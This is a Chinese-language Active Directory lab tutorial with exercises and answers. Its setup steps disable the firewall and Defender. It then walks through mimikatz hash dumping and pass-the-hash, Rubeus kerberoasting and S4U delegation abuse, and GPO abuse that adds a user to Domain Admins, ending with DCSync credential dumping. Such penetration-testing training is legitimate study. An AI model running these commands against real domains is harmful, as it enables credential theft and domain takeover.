[网页版本点我,阅读体验更佳](https://redteaming.net/pages/4e65fc/)
<a name="DEj75"></a>
## 前置知识
刚入门的小伙伴可以去京东或者淘宝购买这本书看一遍
```bash
Windows Server 2012 R2 系统配置指南_戴有炜编著
```
文章是根据[https://github.com/cfalta/adse](https://github.com/cfalta/adsec/tree/main/lab-setup)c 改编。
<a name="Uto9o"></a>
## 环境搭建

<br />[https://github.com/cfalta/adsec/tree/main/lab-setup](https://github.com/cfalta/adsec/tree/main/lab-setup)<br />

- DC-Windows 2019
- User-jack-Windows 2019
- SqlServer-Windows 2019



<a name="35YbW"></a>
### 配置域控
新增一个网卡，三个虚拟机使用这个网卡<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1626617912573-6e2612b3-f2ee-482f-9b3d-6f08e92c5532.png#align=left&display=inline&height=705&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1410&originWidth=1118&size=223438&status=done&style=none&width=559)<br />
<br />设定指定ip<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1626615037732-875a5976-cd1a-4a5f-9d7d-748e7a18e1a6.png#align=left&display=inline&height=806&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1612&originWidth=2048&size=731785&status=done&style=none&width=1024)<br />我是直接复制虚拟机，需要更改mac地址和sid。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1626620042080-e2ab2fe5-ce54-4163-be69-9cf65eb46a53.png#align=left&display=inline&height=719&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1438&originWidth=1280&size=197287&status=done&style=none&width=640)<br />还要更改sid<br />可以使用系统内置的工具sysprep或者另外一个newsid<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1626620377965-0b228666-ea46-4176-bc92-11e1121d127a.png#align=left&display=inline&height=806&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1612&originWidth=2048&size=429498&status=done&style=none&width=1024)<br />工具[https://newsid.softag.com/download](https://newsid.softag.com/download)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1626620745568-bf7741dd-45cc-4441-b625-f493110d4896.png#align=left&display=inline&height=806&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1612&originWidth=2048&size=863603&status=done&style=none&width=1024)<br />
<br />在三台机器上以管理员权限执行以下命令。

- 关闭防火墙
```bash
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```

- 关闭Windows Defender
```bash
Uninstall-WindowsFeature -Name Windows-Defender
```
下载自动化脚本辅助安装<br />[https://github.com/cfalta/adsec/tree/main/lab-setup/domain-setup-scripts](https://github.com/cfalta/adsec/tree/main/lab-setup/domain-setup-scripts)<br />
<br />运行createdomain脚本，自行修改里面的域名称。<br />这里应该不能一步完成<br />先执行
```bash
Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools
```
重启后再继续执行。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1626615851586-c2ecd879-efe5-43fa-92e5-fc81e8087c8e.png#align=left&display=inline&height=806&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1612&originWidth=2048&size=804258&status=done&style=none&width=1024)<br />
<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1626615861366-272c394d-febf-493d-8f8f-e0290fe2c650.png#align=left&display=inline&height=806&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1612&originWidth=2048&size=792064&status=done&style=none&width=1024)<br />
<br />重启后执行这个文件<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1626616353844-fce89788-cbc9-4f58-bdd6-1b6dc86414a8.png#align=left&display=inline&height=806&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1612&originWidth=2048&size=809447&status=done&style=none&width=1024)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1626616386453-80c5b068-7eb1-4b57-a708-ab0f23906627.png#align=left&display=inline&height=744&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1488&originWidth=2420&size=269407&status=done&style=none&width=1210)<br />功能就是根据json文件去自动添加用户和组等等。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1626617095568-3f08c109-feb9-4ad0-be18-d4e0af810d4c.png#align=left&display=inline&height=806&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1612&originWidth=2048&size=420780&status=done&style=none&width=1024)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1626617193069-a59a9bb8-bcb1-4b8d-b255-fd1265f04835.png#align=left&display=inline&height=806&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1612&originWidth=2048&size=164700&status=done&style=none&width=1024)
<a name="c888q"></a>
### 配置域内机器
在两台成员机器上使用以下两个域账号注册

| John Doe | john | P@ssw0rd |
| --- | --- | --- |
| Bruce Lee | blee | TekkenIsAwesome! |


<br />user1这台用john认证<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1626621293722-2c676824-eaae-4fda-b7cd-a4f907b30d8b.png#align=left&display=inline&height=806&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1612&originWidth=2048&size=314921&status=done&style=none&width=1024)<br />user2机器用blee登录
<a name="KdNch"></a>
### 攻击机器准备
用john登录user1这台机器，当做入口点，再分配一张网卡，让他出网。<br />默认工具包下载地址<br />[https://github.com/cfalta/adsec/blob/main/exercises/attacker-tools](https://github.com/cfalta/adsec/blob/main/exercises/attacker-tools)
<a name="Q8E9u"></a>
### bloodhound安装及配置
谷歌一下
<a name="0FlR7"></a>
## 信息收集

<br />导入powerview模块
```bash
cd C:\attacker-tools
cat -raw ".\PowerView.ps1" | iex
```
获取当前域的基本信息和域控位置
```bash
Get-Domain
Get-DomainController
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1626695315985-f9641c2b-940f-457f-805c-1916f8fb4580.png#align=left&display=inline&height=806&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1612&originWidth=2048&size=276427&status=done&style=none&width=1024)<br />查看有多少电脑和域内用户
```bash
Get-DomainComputer
Get-DomainUser
```
过滤出域管出来
```bash
Get-DomainUser | ? {$_.memberof -like "*Domain Admins*"}

Get-DomainUser | ? {$_.memberof -like "*Domain Admins*"} | select samaccountname

```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1626695454796-410456fb-62ed-496e-bd1b-117e7d964c8f.png#align=left&display=inline&height=806&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1612&originWidth=2048&size=319078&status=done&style=none&width=1024)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1626695485107-f1a95f7f-b64d-46bf-8af1-3e32c2fbd76d.png#align=left&display=inline&height=215&margin=%5Bobject%20Object%5D&name=image.png&originHeight=430&originWidth=2020&size=52219&status=done&style=none&width=1010)
<a name="GluFy"></a>
### 课后习题
参考答案我会放在最后面哦

1. 域中有多少台计算机以及它们在什么操作系统上运行？
1. 域中有多少用户？编写一个 powershell 语句进行查询，以表格形式列出所有用户，仅显示属性 samaccountname、displayname、description 和最后一次密码更改的时间。
1. 您能识别出哪些自定义的管理员组？以通用方式更改上面的 powershell 查询，使其仅返回自定义管理组。
1. 找到对应管理员组的成员，这些用户上一次设置密码是什么时候？
1. 有快速识别出域中服务帐户的简单方法吗？编写一个 powershell 查询，列出所有服务帐户。
<a name="XyLSV"></a>
## NTLM的利用

- mimikatz
- psexec

需要管理员权限，使用本地administrator用户登录
```bash
privilege::debug
token::elevate
lsadump::sam
```
获得到管理员hash<br />7dfa0531d73101ca080c7379a9bff1c7<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1626697802826-2f436803-4a8f-4f41-a8b6-f114f7bf41b7.png#align=left&display=inline&height=806&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1612&originWidth=2048&size=386581&status=done&style=none&width=1024)<br />pth攻击
```bash
sekurlsa::pth /user:Administrator /ntlm:7dfa0531d73101ca080c7379a9bff1c7 /domain:wing.lab
```
<a name="q19lT"></a>
## ![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1626698332861-a89b732e-0116-413c-a38c-e7d699a2c439.png#align=left&display=inline&height=806&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1612&originWidth=2048&size=275589&status=done&style=none&width=1024)
```bash
psexec.exe \\user2 cmd
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1626699920674-0011f151-5db0-45dd-a43c-e41b19547600.png#align=left&display=inline&height=806&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1612&originWidth=2048&size=390584&status=done&style=none&width=1024)
<a name="OuCaO"></a>
### 课后习题


1. mimikatz 执行"privilege::debug"和"token::elevate"的目的是什么？为什么需要执行它们？
1. 以 Bruce Lee 的身份登录 user1。使用您在上面学到的知识帮助 john 从内存中远程提取 Bruce Lee的 NTLM 哈希。
1. 如何尽可能的缓解PTH攻击，请讲清楚原因。
1. 是否有可能（并且可行）完全禁用 NTLM？解释你的理由。
<a name="SSXtB"></a>
## Kerberos-Roasting
预习资料[域渗透——AS-REP Roasting](https://www.4hou.com/posts/YVyM)<br />加载插件
```bash
cd C:\attacker-tools
cat -raw .\PowerView.ps1 | iex
cat -raw .\Invoke-Rubeus.ps1 | iex
```
查询SPN，获得服务用户
```bash
Get-DomainUser -SPN | select samaccountname, description, pwdlastset, serviceprincipalname
```
<a name="6J22I"></a>
## ![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1626701732394-5112a647-db90-4d98-bdcf-8479a17a48a1.png#align=left&display=inline&height=806&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1612&originWidth=2048&size=347932&status=done&style=none&width=1024)
Rubeus有一个统计kerberos数据的功能
```bash
Invoke-Rubeus -Command "kerberoast /stats"
```
获取目标账户的TGS
```bash
Invoke-Rubeus -Command "kerberoast /user:taskservice /format:hashcat /outfile:krb5tgs.txt"
```
这里的脚本是base64之后通过powershell内存加载<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1626701844173-fe804803-1ecc-4504-bbf5-b885dbe5f93b.png#align=left&display=inline&height=532&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1064&originWidth=1520&size=250576&status=done&style=none&width=760)
```bash
function Invoke-Rubeus([string]$Command)
{
$Message="base64";

$Assembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($Message))
[Rubeus.Program]::Main($Command.Split(" "))
}
```
<a name="vZo6D"></a>
## ![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1626701923308-87e11bd4-95b9-407f-af07-645ff499b626.png#align=left&display=inline&height=806&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1612&originWidth=2048&size=314695&status=done&style=none&width=1024)
破解TGS
```bash
.\john.exe ..\..\krb5tgs.txt --wordlist=..\..\example.dict --rules=passphrase-rule2
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1626702071318-bcc5f4cf-5db7-4b96-bda3-84cfb46a4d71.png#align=left&display=inline&height=806&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1612&originWidth=2048&size=215045&status=done&style=none&width=1024)
<a name="J8GwG"></a>
### 课后习题

1. 研究如何最好地减轻 kerberoasting 攻击。描述一下您认为最好的缓解技术，并解释其原因。
1. 还有一个用户会受到ASREP roasting影响，请找出来。
1. 解释一下TGS vs. ASREP roasting



<a name="6CAba"></a>
## Kerberos (Delegation)
之前设置的时候没改json里面的数据，要把domain改了<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1626703892023-40aa8d80-eeb9-4ada-828e-5d93f3bc8689.png#align=left&display=inline&height=751&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1502&originWidth=3558&size=436686&status=done&style=none&width=1779)<br />
<br />找到委派用户
```bash
Get-DomainUser -TrustedToAuth
```
查看委派的目标
```bash
Get-DomainUser -TrustedToAuth | select -ExpandProperty msds-allowedtodelegateto
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1626703925805-15dc0bce-8747-4041-a0bc-fc5ac12537cb.png#align=left&display=inline&height=806&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1612&originWidth=2048&size=200626&status=done&style=none&width=1024)<br />执行这个攻击的条件就是要知道用户的密码才行<br />生成hash
```bash
Invoke-Rubeus -Command "hash /password:Amsterdam2015 /domain:wing.lab /user:service1"
```
<a name="3QG3J"></a>
## ![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1626704018104-627733c0-daeb-4f7f-a9df-cd70c0fe0203.png#align=left&display=inline&height=806&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1612&originWidth=2048&size=199843&status=done&style=none&width=1024)
Rubeus允许我们在新的登录会话中启动powershell。这意味着我们伪造的票证只存在于这个登录会话中，不会干扰用户john已经存在的kerboers票证。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1626704079832-4a76e6f0-de0c-4613-9be2-549ac958e50f.png#align=left&display=inline&height=806&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1612&originWidth=2048&size=159087&status=done&style=none&width=1024)<br />使用s4u请求一个TGS模拟域管理用户Bruce（bwillis）攻击user1。<br />
<br />我们请求3个不同服务的票证<br />CIFS将用于SMB访问<br />HOST/RPCSS用于WMI
```bash
Invoke-Rubeus -Command "s4u /user:service1 /aes256:BE09389D798B17683B105FF6432BA4FD4785DA5A08BFD3F39328A6525433E073 /impersonateuser:bwillis /msdsspn:cifs/user1.wing.lab /ptt"
Invoke-Rubeus -Command "s4u /user:service1 /aes256:BE09389D798B17683B105FF6432BA4FD4785DA5A08BFD3F39328A6525433E073  /impersonateuser:bwillis /msdsspn:host/user1.wing.lab /ptt"
Invoke-Rubeus -Command "s4u /user:service1 /aes256:BE09389D798B17683B105FF6432BA4FD4785DA5A08BFD3F39328A6525433E073 /impersonateuser:bwillis /msdsspn:rpcss/user1.wing.lab /ptt"

```
<a name="4MKov"></a>
## ![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1626704418571-95dc9782-effc-4975-b950-faa789563a2c.png#align=left&display=inline&height=806&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1612&originWidth=2048&size=663202&status=done&style=none&width=1024)
查看缓存的票据<br />前面我设置错了，委派的目标应该设置成user2，user1是自己，不过意思都一样。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1626704525216-218371b6-7993-43a8-9183-e543ef961cbc.png#align=left&display=inline&height=806&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1612&originWidth=2048&size=460074&status=done&style=none&width=1024)
```bash
 ls \\user1.wing.lab\C$
```
通过wmi控制user1
```bash
Get-WmiObject -Class win32_process -ComputerName adsec-01.contoso.com
```
<a name="vvzxD"></a>
## 
<a name="Mz068"></a>
### 课后习题

1. 在上面的练习中，您通过SMB和WMI获得了对服务器user的读取权限。现在试着通过这两个协议来执行代码。目标是执行以下命令，将用户john添加到本地管理组
1. 尝试模拟域管理员用户Chuck Norris而不是“Bruce Willis。有什么作用


<br />
<br />

<a name="eZBBE"></a>
## ACL攻击
信息收集
```bash
cat -raw .\SharpHound.ps1 | iex
```


```bash
Invoke-Bloodhound -CollectionMethod DcOnly -Stealth -PrettyJson -NoSaveCache
```

- CollectionMethod DcOnly表示仅从域控收集数据。从opsec的角度来看，这样比较好，因为是正常流量。
- Stealth单线程启动。速度较慢，但安全。
- PrettyJson 格式化.json文件。
- NoSaveCache 不保存缓存文件。


<br />启动血犬<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1626705593143-a60d6656-b3ad-4ede-9a22-b934dd39aa3c.png#align=left&display=inline&height=993&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1986&originWidth=3366&size=242799&status=done&style=none&width=1683)<br />下载社区版的neo4j<br />[https://neo4j.com/download-center/#releases](https://neo4j.com/download-center/#releases)<br />
<br />

```bash
❯ jdk11
❯ ./neo4j start
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1626705876930-b6ee884d-cee3-46a2-9b44-2754c51d129d.png#align=left&display=inline&height=876&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1752&originWidth=4124&size=479932&status=done&style=none&width=2062)<br />
<br />先把service1标记为已沦陷<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1626705949798-f3232246-3cf1-4a5e-92a1-302198afe19c.png#align=left&display=inline&height=524&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1048&originWidth=1954&size=98653&status=done&style=none&width=977)<br />
<br />点击这里<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1626706073835-19f3828b-2599-441f-9c91-83eb6dce37ed.png#align=left&display=inline&height=614&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1228&originWidth=1282&size=232104&status=done&style=none&width=641)<br />
<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1626706051334-490e29ef-8340-40ad-868c-deeca36dbca3.png#align=left&display=inline&height=924&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1848&originWidth=4182&size=417297&status=done&style=none&width=2091)<br />这里显示用户对域控的组策略有写入权限，通过组策略利用，攻击DC<br />需要先以service1的身份登录
```bash
runas /user:wing.lab\service1 powershell
```
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author contoso\adminuser --Command "cmd.exe" --Arguments '/c net group \"Domain Admins\" john /ADD' --GPOName "Default Domain Controllers Policy" --force

```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1626706406755-55caba5e-83d8-4959-9905-c759f1e821e4.png#align=left&display=inline&height=806&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1612&originWidth=2048&size=375995&status=done&style=none&width=1024)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1626706417625-d067083b-5b8c-48d8-8298-20f072d9efb0.png#align=left&display=inline&height=806&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1612&originWidth=2048&size=472894&status=done&style=none&width=1024)<br />
<br />写入完成以后，需要等管理员更新组策略才会触发。<br />手工弄一下。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1626706467985-cb18fd52-5ac7-4165-9300-c73bcf6c184e.png#align=left&display=inline&height=806&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1612&originWidth=2048&size=402799&status=done&style=none&width=1024)<br />提权成功<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1626706557440-f088fd25-45d9-4ba1-84f3-2331211a20c6.png#align=left&display=inline&height=168&margin=%5Bobject%20Object%5D&name=image.png&originHeight=336&originWidth=1438&size=52197&status=done&style=none&width=719)<br />成功登录到域控<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1626706633268-ed727a46-0aa8-4932-a103-d51cf9c0bef2.png#align=left&display=inline&height=806&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1612&originWidth=2048&size=111770&status=done&style=none&width=1024)
<a name="GTVoC"></a>
### 课后习题

- acl攻击有哪些利用工具？
<a name="V5HKo"></a>
## 权限维持
权限维持的东西比较多

- 金银票据
- Mimikatz后门
- 等等等等


<br />一般拿到DC权限就先执行
```bash
lsadump::dcsync /user:krbtgt
```
拿到所有用户hash，也可以作为后门。
<a name="t3MsK"></a>
### 课后习题

- 自主学习这些权限维持方法的原理。
<a name="2N7Gr"></a>
## 参考答案
我做的不一定对，有错误请留言。
<a name="HYu2N"></a>
### 信息收集
powerview3.0 tricks<br />[https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

1. 域中有多少台计算机以及它们在什么操作系统上运行？

![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1626695761312-a0815cdd-0ec5-4b09-ac41-d0760bde8c1d.png#align=left&display=inline&height=430&margin=%5Bobject%20Object%5D&name=image.png&originHeight=860&originWidth=2030&size=90225&status=done&style=none&width=1015)

2. 域中有多少用户？编写一个 powershell 语句进行查询，以表格形式列出所有用户，仅显示属性 samaccountname、displayname、description 和最后一次密码更改的时间。

![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1626695916499-75183536-f914-47e2-aa60-49ce78a0feb9.png#align=left&display=inline&height=329&margin=%5Bobject%20Object%5D&name=image.png&originHeight=658&originWidth=2058&size=170602&status=done&style=none&width=1029)

3. 您能识别出哪些自定义的管理员组？以通用方式更改上面的 powershell 查询，使其仅返回自定义管理组。
```bash
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1626696088431-76e9e75c-9fed-4632-95cb-f6022112b615.png#align=left&display=inline&height=227&margin=%5Bobject%20Object%5D&name=image.png&originHeight=454&originWidth=2056&size=115539&status=done&style=none&width=1028)

4. 找到对应管理员组的成员，这些用户上一次设置密码是什么时候？

![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1626696236972-152da911-38cc-4fdb-a6e9-ff4cb3e6c6db.png#align=left&display=inline&height=260&margin=%5Bobject%20Object%5D&name=image.png&originHeight=520&originWidth=2066&size=121758&status=done&style=none&width=1033)

5. 有快速识别出域中服务帐户的简单方法吗？编写一个 powershell 查询，列出所有服务帐户。
```bash
 Get-DomainUser -SPN|select serviceprincipalname,userprincipalname,pwdlastset,lastlogon
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1626696826881-e28a6e47-2132-41d8-9011-0c0a07f4fecc.png#align=left&display=inline&height=223&margin=%5Bobject%20Object%5D&name=image.png&originHeight=446&originWidth=2040&size=95788&status=done&style=none&width=1020)
<a name="kAxXf"></a>
### NTLM
[猕猴桃命令大全](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md)

1. mimikatz 执行"privilege::debug"和"token::elevate"的目的是什么？为什么需要执行它们？
```bash
privilege::debug - 提升为管理员权限
token::elevate - 伪造令牌，获得system权限或发现其他用户的令牌
```

2. 以 Bruce Lee 的身份登录 user1。使用您在上面学到的知识帮助 john 从内存中远程提取 Bruce Lee的 NTLM 哈希。
```bash
lsadump::dcsync /domain:wing.lab /user:bruce

dump所有数据
lsadump::dcsync /domain:wing.lab /all /csv
```

3. 如何尽可能的缓解PTH攻击，请讲清楚原因。
- 打上补丁kb2871997并且禁用SID=500的管理员用户
- 监控日志
4. 是否有可能（并且可行）完全禁用 NTLM？解释你的理由。
- 审查收到的NTLM流量：启用对所有帐户的审查
- 仅发送NTLMv2响应。拒绝LM＆NTLM

第四点我不太确定。
<a name="0lAMk"></a>
### Kerberos (Roasting)

1. 研究如何最好地减轻 kerberoasting 攻击。描述一下您认为最好的缓解技术，并解释其原因。
- 禁止用户开启`Do not require Kerberos preauthentication`
- 禁止弱口令
2. 还有一个用户会受到ASREP roasting影响，请找出来。

Get-DomainUser -PreauthNotRequired -Verbose<br />

3. 解释一下TGS vs. ASREP roasting

[https://www.4hou.com/posts/YVyM](https://www.4hou.com/posts/YVyM)<br />

<a name="XTgmG"></a>
### Kerberos (Delegation)

1. 在上面的练习中，您通过SMB和WMI获得了对服务器user的读取权限。现在试着通过这两个协议来执行代码。目标是执行以下命令，将用户john添加到本地管理组：
- psexec
```bash
wmic /node:user1 process call create "cmd.exe /c net localgroup Administrators john /add"
```


2. 尝试模拟域管理员用户Chuck Norris而不是“Bruce Willis。有什么作用？

可以攻击域控
<a name="L8Ylq"></a>
### ACL
acl攻击有哪些利用工具？

- github.com
<a name="ciC90"></a>
### 权限维持

- 自主学习这些权限维持的原理。
